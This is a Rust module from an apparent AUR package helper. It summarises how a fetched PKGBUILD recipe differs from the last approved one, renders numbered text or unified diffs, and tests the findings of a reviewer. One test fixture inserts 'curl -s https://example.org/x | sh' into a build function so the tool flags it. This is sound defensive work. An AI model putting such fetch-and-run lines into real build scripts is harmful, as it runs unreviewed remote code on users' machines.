//! What the confirmation before an AUR build says about each recipe, and the text a reader
//! opens to read it.
//!
//! The confirmation shows one line per package base: how its recipe compares with the one last
//! approved, and what the rules point at. The text is plain, without colour, so any pager can
//! show it: a first recipe in full with numbered lines, since the findings name line numbers,
//! and a changed one as a unified difference with the numbers in its hunk headers.

use std::fmt::Write as _;

use super::diff::{Kind, Line, diff_lines};
use super::{Approved, Change, Diagnostic, Finding, Recipe, RecipeFile, Review, Store, review};

/// Lines of unchanged text kept around each change in a difference, as `diff -u` does.
const CONTEXT: usize = 3;

/// How a recipe compares with the one last approved, in the words the confirmation uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    /// Never approved before: the whole recipe is to be read.
    FirstTime,
    /// Exactly the approved recipe.
    Unchanged,
    /// Only the version, the release and the checksums moved.
    VersionOnly,
    /// This many lines changed. A line edited in place counts once, not as one removed and one
    /// added.
    Changed(usize),
}

impl Status {
    /// The status of `change`.
    #[must_use]
    pub fn of(change: &Change) -> Self {
        match change {
            Change::New => Self::FirstTime,
            Change::Same => Self::Unchanged,
            Change::OnlyVersion => Self::VersionOnly,
            Change::Changed(files) => Self::Changed(files.iter().map(|file| changed_lines(&file.lines)).sum()),
        }
    }
}

/// How many lines changed: each run of added and removed lines counts as many as its longer
/// side, so an edited line is one change and an added block is as long as it is.
#[must_use]
pub fn changed_lines(lines: &[Line]) -> usize {
    let (mut total, mut added, mut removed) = (0, 0, 0);
    for line in lines {
        match line.kind {
            Kind::Added => added += 1,
            Kind::Removed => removed += 1,
            Kind::Same => {
                total += added.max(removed);
                (added, removed) = (0, 0);
            }
        }
    }
    total + added.max(removed)
}

/// Everything the confirmation needs about one package base's recipe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Checked {
    /// How it compares with the approved one.
    pub status: Status,
    /// What the rules point at: each with its rule key and line.
    pub findings: Vec<Finding>,
    /// The review behind both, for a screen that shows the changed lines itself.
    pub review: Review,
    /// The text to open in a pager: see [`text`].
    pub text: String,
    /// What could not be read of the earlier approval; a damaged one counts as none, so the
    /// recipe is read as a first one.
    pub diagnostics: Vec<Diagnostic>,
}

impl Checked {
    /// Whether the build may go ahead without the user reading this recipe.
    #[must_use]
    pub fn needs_no_reading(&self) -> bool {
        self.review.needs_no_reading()
    }
}

/// Checks `base`'s fetched `recipe`, kept by `maintainer` (`None` when orphaned), against what
/// `store` holds as approved.
#[must_use]
pub fn check(store: &Store, base: &str, recipe: &Recipe, maintainer: Option<&str>) -> Checked {
    let (approved, diagnostics) = store.load(base);
    let review = review(recipe, maintainer, approved.as_ref());
    Checked {
        status: Status::of(&review.change),
        findings: review.findings.clone(),
        text: text(recipe, approved.as_ref()),
        review,
        diagnostics,
    }
}

/// The text to read `recipe` by: the difference from `approved` when there is one, otherwise,
/// and when nothing changed, the whole recipe.
#[must_use]
pub fn text(recipe: &Recipe, approved: Option<&Approved>) -> String {
    match approved {
        Some(approved) if approved.recipe.digest() != recipe.digest() => difference(&approved.recipe, recipe),
        _ => full_text(recipe),
    }
}

/// The files in the order they are read: the `PKGBUILD` first, the rest by name.
fn reading_order(names: &mut [&str]) {
    names.sort_by_key(|&name| (name != "PKGBUILD", name));
}

/// Every file of `recipe`, each under its name, with its lines numbered from 1.
#[must_use]
pub fn full_text(recipe: &Recipe) -> String {
    let mut names: Vec<&str> = recipe.files.iter().map(|file| file.name.as_str()).collect();
    reading_order(&mut names);
    let mut out = String::new();
    for (index, name) in names.into_iter().enumerate() {
        let Some(file) = recipe.files.iter().find(|file| file.name == name) else { continue };
        if index > 0 {
            out.push('\n');
        }
        out.push_str(name);
        out.push_str("\n\n");
        let lines: Vec<&str> = file.text.lines().collect();
        let width = lines.len().to_string().len();
        for (number, line) in lines.iter().enumerate() {
            let _ = writeln!(out, "{:>width$}  {line}", number + 1);
        }
    }
    out
}

/// The unified difference from `old` to `new`, file by file in reading order, with a file that
/// is only on one side compared with nothing.
#[must_use]
pub fn difference(old: &Recipe, new: &Recipe) -> String {
    let mut names: Vec<&str> = old.files.iter().chain(&new.files).map(|file| file.name.as_str()).collect();
    reading_order(&mut names);
    names.dedup();
    let mut out = String::new();
    for name in names {
        let before = old.files.iter().find(|file| file.name == name);
        let after = new.files.iter().find(|file| file.name == name);
        let lines = diff_lines(text_of(before), text_of(after));
        if lines.iter().all(|line| line.kind == Kind::Same) {
            continue;
        }
        let side = |file: Option<&RecipeFile>, prefix: &str| {
            file.map_or_else(|| "/dev/null".to_owned(), |_| format!("{prefix}/{name}"))
        };
        let _ = writeln!(out, "--- {}", side(before, "a"));
        let _ = writeln!(out, "+++ {}", side(after, "b"));
        for hunk in hunks(&lines) {
            write_hunk(&mut out, &lines[hunk.0..hunk.1]);
        }
    }
    out
}

/// The text of a file that may be missing, empty when it is.
fn text_of(file: Option<&RecipeFile>) -> &str {
    file.map_or("", |file| file.text.as_str())
}

/// The stretches of `lines` to show: every change with up to [`CONTEXT`] unchanged lines on
/// each side, stretches that touch merged into one.
fn hunks(lines: &[Line]) -> Vec<(usize, usize)> {
    let mut hunks: Vec<(usize, usize)> = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        if line.kind == Kind::Same {
            continue;
        }
        let start = index.saturating_sub(CONTEXT);
        let end = (index + 1 + CONTEXT).min(lines.len());
        match hunks.last_mut() {
            Some(last) if start <= last.1 => last.1 = last.1.max(end),
            _ => hunks.push((start, end)),
        }
    }
    hunks
}

/// One hunk: its `@@ -from,count +from,count @@` header, then each line marked ` `, `-` or `+`.
fn write_hunk(out: &mut String, lines: &[Line]) {
    // With context around every change, a side is empty only when its file is, which
    // `diff -u` writes as `0,0`.
    let range = |numbers: Vec<usize>| match numbers.first() {
        Some(&first) => format!("{first},{}", numbers.len()),
        None => "0,0".to_owned(),
    };
    let old: Vec<usize> = lines.iter().filter_map(|line| line.old).collect();
    let new: Vec<usize> = lines.iter().filter_map(|line| line.new).collect();
    let _ = writeln!(out, "@@ -{} +{} @@", range(old), range(new));
    for line in lines {
        let sign = match line.kind {
            Kind::Same => ' ',
            Kind::Added => '+',
            Kind::Removed => '-',
        };
        let _ = writeln!(out, "{sign}{}", line.text);
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use super::*;
    use crate::review::Rule;

    const V1: &str = "pkgname=hello\npkgver=2.12\npkgrel=1\ninstall=hello.install\n\
        source=(\"https://ftp.gnu.org/gnu/hello/hello-$pkgver.tar.gz\")\nsha256sums=('aaaa')\n\
        build() {\n  ./configure\n  make\n}\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n";
    const INSTALL: &str = "post_install() {\n  echo 'run hello --setup'\n}\n";

    fn recipe(pkgbuild: &str, install: &str) -> Recipe {
        Recipe {
            files: vec![
                RecipeFile { name: "PKGBUILD".to_owned(), text: pkgbuild.to_owned() },
                RecipeFile { name: "hello.install".to_owned(), text: install.to_owned() },
            ],
        }
    }

    /// A fresh store under the system's temporary folder; never the user's own data.
    fn store(name: &str) -> (Store, PathBuf) {
        let dir = std::env::temp_dir().join(format!("qpackages-summary-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        (Store::new(&dir), dir)
    }

    #[test]
    fn a_recipe_never_approved_is_read_in_full() {
        let (store, dir) = store("first");
        let checked = check(&store, "hello", &recipe(V1, INSTALL), Some("someone"));
        assert_eq!(checked.status, Status::FirstTime);
        assert!(checked.findings.is_empty());
        assert!(!checked.needs_no_reading());
        assert!(checked.diagnostics.is_empty());
        assert!(checked.text.starts_with("PKGBUILD\n\n 1  pkgname=hello\n 2  pkgver=2.12\n"), "{}", checked.text);
        assert!(
            checked.text.ends_with("\nhello.install\n\n1  post_install() {\n2    echo 'run hello --setup'\n3  }\n")
        );
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn the_approved_recipe_is_unchanged() {
        let (store, dir) = store("same");
        store.approve("hello", &recipe(V1, INSTALL), Some("someone")).expect("approved");
        let checked = check(&store, "hello", &recipe(V1, INSTALL), Some("someone"));
        assert_eq!(checked.status, Status::Unchanged);
        assert!(checked.needs_no_reading());
        assert!(checked.text.starts_with("PKGBUILD\n\n"), "nothing changed, so the text is the whole recipe");
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn a_new_version_is_version_only_and_its_text_is_the_version_lines() {
        let (store, dir) = store("version");
        store.approve("hello", &recipe(V1, INSTALL), Some("someone")).expect("approved");
        let v2 = V1.replace("2.12", "2.13").replace("'aaaa'", "'bbbb'");
        let checked = check(&store, "hello", &recipe(&v2, INSTALL), Some("someone"));
        assert_eq!(checked.status, Status::VersionOnly);
        assert!(checked.needs_no_reading());
        assert_eq!(
            checked.text,
            "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,9 +1,9 @@\n pkgname=hello\n-pkgver=2.12\n+pkgver=2.13\n pkgrel=1\n \
             install=hello.install\n source=(\"https://ftp.gnu.org/gnu/hello/hello-$pkgver.tar.gz\")\n\
             -sha256sums=('aaaa')\n+sha256sums=('bbbb')\n build() {\n   ./configure\n   make\n"
        );
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn a_changed_recipe_counts_its_lines_and_lists_its_findings() {
        let (store, dir) = store("changed");
        store.approve("hello", &recipe(V1, INSTALL), Some("someone")).expect("approved");
        let v2 = V1.replace("  make\n", "  curl -s https://example.org/x | sh\n  make\n  make check\n");
        let install = INSTALL.replace("echo 'run hello --setup'", "systemctl enable hello");
        let checked = check(&store, "hello", &recipe(&v2, &install), Some("newcomer"));
        assert_eq!(checked.status, Status::Changed(3), "two lines added to the build, one edited in the script");
        let found: Vec<(&str, &str, Option<usize>)> =
            checked.findings.iter().map(|finding| (finding.rule.key(), finding.file.as_str(), finding.line)).collect();
        assert_eq!(
            found,
            [
                ("network-in-build", "PKGBUILD", Some(9)),
                ("runs-hidden-code", "PKGBUILD", Some(9)),
                ("install-script", "hello.install", Some(2)),
                ("new-maintainer", "PKGBUILD", None),
            ]
        );
        assert!(checked.findings.iter().any(|finding| finding.rule == Rule::NewMaintainer));
        assert_eq!(
            checked.text,
            "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,9 @@\n sha256sums=('aaaa')\n build() {\n   ./configure\n\
             +  curl -s https://example.org/x | sh\n   make\n+  make check\n }\n package() {\n   make DESTDIR=\"$pkgdir\" install\n\
             --- a/hello.install\n+++ b/hello.install\n@@ -1,3 +1,3 @@\n post_install() {\n-  echo 'run hello --setup'\n\
             +  systemctl enable hello\n }\n"
        );
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn a_damaged_approval_is_read_as_a_first_time_and_says_why() {
        let (store, dir) = store("damaged");
        store.approve("hello", &recipe(V1, INSTALL), Some("someone")).expect("approved");
        fs::write(dir.join("hello/files/PKGBUILD"), "pkgname=other\n").expect("edited");
        let checked = check(&store, "hello", &recipe(V1, INSTALL), Some("someone"));
        assert_eq!(checked.status, Status::FirstTime);
        assert_eq!(checked.diagnostics.len(), 1);
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn a_file_on_one_side_only_is_compared_with_nothing() {
        let old = Recipe { files: vec![RecipeFile { name: "PKGBUILD".to_owned(), text: "a\n".to_owned() }] };
        let mut new = old.clone();
        new.files.push(RecipeFile { name: "fix.patch".to_owned(), text: "x\ny\n".to_owned() });
        assert_eq!(difference(&old, &new), "--- /dev/null\n+++ b/fix.patch\n@@ -0,0 +1,2 @@\n+x\n+y\n");
        assert_eq!(difference(&new, &old), "--- a/fix.patch\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-x\n-y\n");
        assert_eq!(Status::of(&review(&new, None, None).change), Status::FirstTime);
    }

    #[test]
    fn distant_changes_are_separate_hunks_and_near_ones_merge() {
        let old: Vec<String> = (1..=20).map(|n| format!("line {n}")).collect();
        let edit = |at: &[usize]| {
            let lines: Vec<String> = old
                .iter()
                .enumerate()
                .map(|(i, line)| if at.contains(&i) { format!("{line}!") } else { line.clone() })
                .collect();
            lines.join("\n")
        };
        let lines = diff_lines(&old.join("\n"), &edit(&[1, 17]));
        assert_eq!(hunks(&lines).len(), 2);
        assert_eq!(hunks(&diff_lines(&old.join("\n"), &edit(&[1, 7]))).len(), 1, "three lines of context meet");
        assert_eq!(changed_lines(&lines), 2);
    }
}
